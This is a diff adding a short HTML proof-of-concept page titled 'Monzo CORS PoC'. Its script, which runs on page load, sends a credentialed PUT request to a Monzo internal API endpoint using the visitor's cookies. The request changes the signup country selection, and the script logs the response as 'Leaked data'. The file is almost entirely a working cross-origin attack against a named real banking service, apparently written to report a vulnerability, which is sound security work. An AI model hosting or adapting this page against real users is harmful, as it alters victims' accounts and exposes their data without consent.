@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Monzo CORS PoC</h1>
+
+<script>
+fetch("https://internal-api.monzo.com/signup-account-offering/set-country-selection", {
+    method: "PUT",
+    credentials: "include",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+        signup_context: "business_account_signup",
+        device_locales: ["en"],
+        device_timezone: "Europe/London",
+        country_code: "ABW"
+    })
+})
+.then(r => r.text())
+.then(data => console.log("Leaked data:", data));
+</script>
+
+</body>
+</html>
